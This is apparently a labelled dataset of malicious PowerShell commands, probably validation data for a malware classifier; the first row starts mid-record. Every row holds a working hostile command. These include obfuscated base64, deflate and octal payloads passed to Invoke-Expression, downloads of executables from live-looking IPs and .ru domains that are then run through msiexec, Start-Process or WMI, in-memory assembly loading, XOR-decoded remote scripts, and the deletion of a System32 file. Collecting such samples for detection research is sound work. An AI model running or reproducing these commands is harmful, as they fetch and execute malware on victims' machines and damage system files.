[systeM.ConVerT]::FrOmBASe64STRiNg('rVNNb9NAEL3vrxilPjhS4sC1okVpG1BEmlpxUEHQw9qexAu21+yu45qq/53ZrRsnpeKEpXx45+O9efN2U5eJEbKEVDZlLnk6xntM2AN7d8KC6OvyJozmEVOYKlmKEire2iQwcl8AvKTPxqBquEo12PraIB23UMkGlc4wz0EnSlQmYCy4mkWXq3m4nt8s2ToTugtBIyjtoKs0Gaq/W8BGyYLC8Hm1GEGKVS5b7Uh0yBqEAZqIg+FqiyYAgsF9Z0yPAGMEzXd02AiTUY2iTtR/I3IseYEjOyrfSUEzW67ECcalTHOQldMtISbUo9aY9qnUUZRbl9xhUaZ96xiRCuF0Nb2erWcrqFXuCNI8R7ra/NenP663bNitZe8YVlwRb1oHBdwYL+YkiGMmsy/T63AxY2EE58c2gMyY6nQyqbg2GIsySGQxUbwJqqx6L85Onh6nR1f2v9s5fzSyzskQuZa9uTo5RhDXxq1O0m8nO63/aEgitZgvPzELrwl/S+l17NCF0Tz+3cp68mxxdnLOGNDz7bJIczQXokypqT+8g9Aq67ugSwiflfZDqYVzwxm8GcE1WYgbqVp69daqxuFdXxQZRe36A4/WP2IHcRomyQ7ibr3239B9iw347gzG+As8Y9u7wMO+ZF7u5E8cz+4rhVpbWr6/xGZ8E//AxMCS1n6L8WUusDTD4KrT+omYP/Aipyy5cTAc7nuKje9N1bYuqEb3xz3o68B9zT7xkfXfmGt8Qd6zF5CE+4hmvHJ3sQ81GCeONcUPBopa8lMRHM3VF9kr0F3qMxh4WO5OKbv67oCCSr8dvAKwV+UDVftuR4ODToNeAe/JiKfO1Due10gw/bUNyLFAiljbkiChzEXSwkVL6do6fSG3EsZkxcKOfQDxj216PVan5SP7Aw=='),[io.comPRESsIOn.comPREssIOnMOde]::deCOmPRess) |% { nEW-oBJEcT io.StReaMREAdeR( $_ , [TexT.encODINg]::AsCII)} ).ReADtoend( )|InvOKE-eXprESSIOn"""
+seed_b602dfcc3514,fa2y/malicious_samples/882a95aefca2a66599c6268f9e10fae7e981fdcea3adda7ea2e4dce403cb22d8-obf-out-encodedoctalcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,313,malicious,Invoke-Expression,Invoke-Expression,cross_runtime,malicious,4.734375,1254,"powershell   "" [stRINg]::jOIN( '' ,('42h103_72z134z127g151l156}144U157z167}163h134}123U171f163U164v145f155U63f62}134v143f155l144v56z145h170}145z42h40}57_143}40_160A157A167v105z162f163h150A105_154}154h40f55v156f157v160A40U55l167f40z150_151U144U144_105z156A40v55h105z160_40U142g171g160h141U163g163U40U55A105g156v143z40A123z121l102z106g101_106}147U101f111A101v101A157}101}105A64l101f132U121g102h63l101v103f60A101f124g167}102A151z101_107g157g101l132_121U102U152_101h110A121}101h111A101z102v117l101v107U125A101_144l101g101U165g101f106_143}101h132A121A102v151f101}107}115_101_142_101l102v160_101_107f125A101U142z147}102l60}101U103A153}101_114_147U102U153l101g107U70}101h144g167_102_165v101_107f167U101l142f167z102f150_101f107f121}101}143_167z102l60g101}110U111}101f141A121g102_165f101U107f143z101f113h101U101g151v101z107g147h101l144_101U102g60}101A110f101l101U117l147h101U166g101_103h70A101_142h101v102}166f101f107l143f101v141z121v102U165f101h107}167_101A141g121h102f165g101_107z125_101v114A147l102}60}101_107A70z101v143_101l101A166}101U107l153_101f142l147z102_153v101z107A125l101_145l101_101U165_101}110}101h101_141h101h102l167g101_103h111_101v113h121U101f75'.SPLIt( 'vlzg}fhAU_' ) |% { ([ChaR]([cOnveRT]::tOint16(([stRinG]$_ ),8 ) ))} )) | inVOKe-eXPReSsiOn"""
+seed_9467821f5750,2789.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,315,malicious,Invoke-Expression,Invoke-Expression|FromBase64String,cross_runtime,malicious,1.375,1625,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('rVZtb5tIEP4eKf9hzuHOoBpku011FymVUuo7WUpTK0TKB8u6EBgHLngXLYtflPa/3+yCDdiO4zsVJQaWmWefGZ6ZYZqzQMacwZDN+TPaI75A4UWYJHdBCqcnL/QPdIzdWZig/ByzMGZP5hec+nkiR77wZyjJA+UNXV22BM5RZNiyJqAfmqcnBYAG2dibI57Fet9L6Hbgq89CX3KxoltDihw7cAj6vyJO/STbC/lI4TTxPCkovtqKMRxdhaHALOu8HUrvp4dyLOJuJEMm62GMuJCvRnAcQW8RyyCqg94WZsfj7kn4DqjS2BrQWl8Uv5KSUFy9VA5nLmcMAwmPfvAM8RRkhFAGAJmGhziDPMPQqbzIzlzzt6rlGq4mEyQxMkmZv8GF/e3xH7WPt8okzpwblI7Hg2eUmXPnjlxtadb0onNew/5RT9OZChMk12xTwedxiCGk5KGo6YeHuSuTA8STmEgyFER9vI9wkF6XFhPN8xV3J5O+kKZVvYPd1FTGV0GAqSTsMhn14KEevZFJgf5MORcwzl8oPb1Wdxo/riSOJxNDnTNV2Y7z8fz8/fn3X1+6zXR6SBnTCghyIRQxSppgpDqg+oGAz9JcFgt1GuS1xjbHEpfSQRZw1eMmFxdXnjscWoraZ2Vjtu4p53yRQdUlQeSMkTX4+i0JaME7MJDNLzbbv6M1quXNgzoV9fCBuTxdifgpkmC6FvS7vXP4GgeCZ3wqweWCVOGrfuDAldpRWWakcNpgTrp4YA+sZe3k1rkXsUSzCrHT7VQ3zjWyJxlZzRxGfEHZgpgRPZ/mwhzroZJKZ6n839lrjzxoU8AmrdjXPNAhWc7IlxGttj+1f0YMiyhO0DSNWEmrBLlFPzQLCXXUbDAa3hbYDKF7oJQGKiYM7yi+ZiOw71Ypqsa2bgnKxNFxD8o8bEFRI/cVsxpkqXw1VY11jGDEVtOTOl9zYYukfn+DJQakLN1SSGUzJXxSnrqlKn6i8t91KtKp6obeYfkRMFimqoGpCWS7JU5Bvf/ptx58h2+5tAvOsMXzR/OWXnIQvUlcv2X73he6kloep6ERqcuFquOF4OoyJpmgDlDx4tNXImzBa/gDIbgA4++DhDfp6INW0Do5JNA35AvtLaSlyqiBatdxd9LI2lbSCiMnSNAX5vazitBl/YaaybIufHWc3aLMBSsHYEYfaNk+MBLZUQVb7bbDaW911ouzqs19jn8meRapodIYjhurciS4Cc+wng8999bD5ojZ53iSp6a1s0l5qomzhnCEGH8BN8LqW0P3YaHmNAUXRP5jUsycFc/BF0hzQbkXRUmjiRqHGvMNpe5TKLGkv73f5Xb54QL25msDen/0nd7H350PdHrfB1sNdfhAx+nJvw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
+seed_b425d8ade6ab,fa2y/malicious_samples/809c76fa535ae6532ce29d85d8ca042036f4d0c3f4a536efecdf78e5b85e9c5b.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,316,malicious,Invoke-Expression,Invoke-Expression|FromBase64String,cross_runtime,malicious,0.265625,1687,"Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""9tzZlp2dkAibvl2czVmcwhXRtU2avZnbJtTKw0lchh2YbhSbpJHVukCZrFHdkgyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgcWZqdHJ7kiNxASLggGdn5WZM5iYj9WYkACL2EDIsI2YvFGJos2YvxmQsFmbpZUby9mZz5WYyRlL0l3dhRCI9ACZrFHdksTKoI3b0BXeyNWZEVGdhVmcD5iZrNXckASPgQXe3FGJ7kyZxZHekgyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1Wg0DI5V2SuY2azFHJ7EGbwRCI9AiVJ5iZrNXcksjN1IDI9ASZ6l2U5V2SuY2azFHJ7gjMxASPgUmepN1aj9GbC5iZrNXckszcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIn5WakRWYQ5iZrNXckszQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1Wg0DIlR2bN5iZrNXcksjIkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3UiACdjVmai9UL3VmTg0DImt2cxRyOdVTMu4CMbJ2YvFGJg0DIhxGcksTKj1WcwRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbBSPgI2YvFGJ7IiIgwiIcxlIgU2YhxGclJXLgMWbxBHJg0DIj1WcwRyOlVHbhZlLdFzWzBXdvJ3RukiI68DX68DXp8jKugyPc9DX6ojIgwSbvBHbkgCajRXYNpjOdhXZnVmcbBSPgMWbxBHJ7kSbzRXckgyZulmc0NFZh9Gbud3bE5SK05WZpx2QiV2VuQXZOBCdjVmai9WL3VmboASPg02bwxGJ7BSKyVmbpFGdu92QgUGc5RFa0FGUtAyc45mbkACa0FGUtACa0FGUtQ3clRFKgYWa7ICXiAyKgEnbzlHJgsCIiwlIgsCItFXe4RCI9Ayc45mbksTKpIyaXRDNigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DIx52c5RyOoRXYQ5SKu9Wa0F2YvxWL0V2ZoQCI9ASbxlHeksjI9ADM0pVe65GZN9CO4pkNiJ0MpN1bqN3MvRHUGxGSwoWMHBDUuJ3VmJHZ2tmIg0DInFnd4RyOpkiI1ljMjFXNT5UNnR0T6dmIgsCIiQkT3dmeMZnVHpFcaNDT5l1MMJCIrAiIwJEWZZHMyIma1knYsFzVhJTO5JCIrAiIMZTTINGMShUYigyZulmc0NFN2U2chJUbvJnR6oTX0JXZ252bD5SblR3c5N1WocmbpJHdTRXZH5COGRVV6oTXn5Wak92YuVkL0hXZU5SblR3c5N1Wg0DItNHdxRyOiQTNzYDMiBTOhRTN4MzYxIGZlFTMhZWMkRzNwUmZhFGNiASPgQWa1VHJ""[-1..-1568] -join '')));"
+seed_017509287b2d,1362.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,339,malicious,Invoke-WebRequest,Invoke-WebRequest,cross_runtime,malicious,0.171875,80,Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe
+seed_ebc39e9baa2c,fa2y/malicious_samples/d1727799f2fa203f982f632e38e2add1a8d4591086994422871baa8ba541deb3.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,341,malicious,Invoke-WebRequest,Invoke-WebRequest,cross_runtime,malicious,2.625,102,Invoke-WebRequest http://185.170.144.156:9393/vmZqQGA.exe -OutFile C:\Users\MSSQLSERVER\Q1XGN03O.exe  
+seed_a430e3a89960,fa2y/malicious_samples/931e9ed169ed0863ac4d1f3aa76c9ab110006583a131953f6d0dc67fe47b094c.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,342,malicious,Invoke-WebRequest,Invoke-WebRequest,cross_runtime,malicious,3.96875,195,"mkdir -force $env:TEMP\TCD506A_.tmp;Invoke-WebRequest ""http://83.212.111.137/down/elevated.msi"" -OutFile ""$env:TEMP\TCD506A_.tmp\elevated.msi"";msiexec /q /i ""$env:TEMP\TCD506A_.tmp\elevated.msi"";"
+seed_6233bf193815,fa2y/malicious_samples/09e9a397f6be8c687f716aed44247aa05c4fd170359c1d20347ac090f426aace.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,344,malicious,Invoke-WebRequest,Invoke-WebRequest,cross_runtime,malicious,5.921875,293,PowerShell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -command Invoke-WebRequest -Uri 'http://www.kalodon.ru/upload/TT5B.exe' -OutFile  $env:APPDATA\sdiofjhgsourephoei.scr ;Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList ( $env:APPDATA\sdiofjhgsourephoei.scr )
+seed_78935433549c,fa2y/malicious_samples/a08f454cf7acc9dd6c0cab691612f3364df7884acedc307ee96fb96edd6f5c96.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,345,malicious,Invoke-WebRequest,Invoke-WebRequest|Start-Process,cross_runtime,malicious,2.921875,296,"New-Item -ItemType Directory -Path ""C:\Temp""
+Invoke-WebRequest -Uri ""https://files.zortos.me/Files/Expirimental/Cloudforce-Revamped-V3.exe"" -OutFile ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Start-Process -FilePath ""C:\Temp\Cloudforce-Revamped-V3.exe""
+Remove-Item -Path ""C:\Windows\System32\diskc.sys"""
+seed_d1dab60aa6f5,fa2y/malicious_samples/35f003c6ee4b9261caac262983739bceabc65c859b01414d170942cfd92de495.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,348,malicious,Invoke-WebRequest,Invoke-WebRequest|Net.WebClient,cross_runtime,malicious,5.625,547,"sleep -Milliseconds 1235
+
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/start.php') -UseBasicParsing
+
+$bytes = (New-Object System.Net.WebClient).DownloadData(""https://adv-pardorudy.ru/dwnld/chatgpt.jpg"")
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+$method = $assembly.EntryPoint
+if ($method) {
+    $args1 = @($null)
+    $method.Invoke($null, $args1)
+}
+
+Invoke-WebRequest -Uri ('ht'+'t'+'ps:'+'//'+'advert-job.ru/install.php') -UseBasicParsing"
+seed_f99df091624c,3834.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,349,malicious,Invoke-WebRequest,IEX|DownloadString|Invoke-WebRequest|Net.WebClient,cross_runtime,malicious,10.546875,552,"$WC=NEw-OBjeCt SySTEM.NET.WebCLIent; $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeAdeRS.ADd('User-Agent',$u);$wc.PRoxY = [SyStEm.NET.WeBReQUEst]::DeFaultWEbProxy;$WC.PrOXy.CRedentiAlS = [SySTem.Net.CrEdentiAlCAchE]::DeFAulTNetWorkCreDEnTIALS;Invoke-WebRequest -Uri ""http://fooker01.ho4x.com/tt.exe"" -OutFile ""$Env:Temp\tt.exe"";IEX(""$Env:Temp\tt.exe"");$K='wnVP}G,+AHW?;`SO2c$^g/FYEe&.XQo*';$i=0;[CHar[]]$B=([char[]]($WC.DoWnLoAdSTriNg(""http://192.ho4x.com:80/index.asp"")))|%{$_-bXor$K[$i++%$k.LeNgTh]};IEX ($B-jOin'');"
+seed_124883cece34,fa2y/malicious_samples/9724cca0b85958d7c2a57c7ad57984f7874c8a1a98f6f6eef4f8871e2ffdb100.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,351,malicious,Invoke-WebRequest,Invoke-Expression|FromBase64String|Invoke-WebRequest,cross_runtime,malicious,1.03125,678,[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
